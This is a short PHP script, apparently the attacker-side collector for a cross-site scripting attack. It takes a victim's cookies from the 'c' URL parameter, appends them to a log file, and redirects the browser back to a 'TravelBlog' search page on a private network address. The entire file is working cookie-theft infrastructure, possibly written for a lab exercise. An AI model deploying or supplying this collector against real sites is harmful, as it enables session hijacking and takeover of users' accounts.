<?php
$cookies = $_GET["c"];
$file = fopen('log.text', 'a');
fwrite($file, $cookies ."\n\n");
header ('Location:http://192.168.0.41/TravelBlog/search_authors.php');
?>